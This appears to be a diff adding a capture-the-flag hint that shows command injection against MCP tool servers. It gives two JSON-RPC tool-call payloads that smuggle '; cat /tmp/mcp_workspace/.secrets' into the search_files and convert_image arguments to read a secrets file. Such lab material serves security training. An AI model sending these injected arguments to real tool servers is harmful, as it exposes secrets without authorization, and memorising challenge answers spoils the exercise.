@@ -1,0 +1,35 @@
+💡 HINT 3 (20 XP):
+
+Use the search_files tool with command injection:
+
+Example MCP request:
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "search_files",
+    "arguments": {
+      "pattern": "FLAG; cat /tmp/mcp_workspace/.secrets #",
+      "directory": "/tmp"
+    }
+  }
+}
+
+The # comments out the rest of the command to avoid syntax errors.
+
+Alternative - use convert_image:
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "convert_image",
+    "arguments": {
+      "input_file": "test.jpg; cat /tmp/mcp_workspace/.secrets",
+      "output_format": "png"
+    }
+  }
+}
+
+The flag will appear in the response output.
